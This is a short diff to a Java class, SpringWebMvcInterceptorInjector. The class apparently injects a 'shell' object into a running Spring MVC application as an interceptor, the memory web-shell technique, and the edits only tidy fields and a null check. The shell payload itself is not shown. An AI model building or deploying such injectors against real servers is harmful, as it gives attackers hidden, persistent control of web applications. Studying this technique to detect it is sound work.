@@ -15,11 +15,10 @@ import java.util.zip.GZIPInputStream;
  */
 public class SpringWebMvcInterceptorInjector {
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public SpringWebMvcInterceptorInjector() {
         if (ok) {
@@ -31,9 +30,7 @@ public class SpringWebMvcInterceptorInjector {
         } catch (Throwable e) {
            
         }
-        if (context == null) {
-            
-        } else {
+        if (context != null) {
             try {
                 Object shell = getShell();
                 inject(context, shell);
@@ -43,7 +40,6 @@ public class SpringWebMvcInterceptorInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     
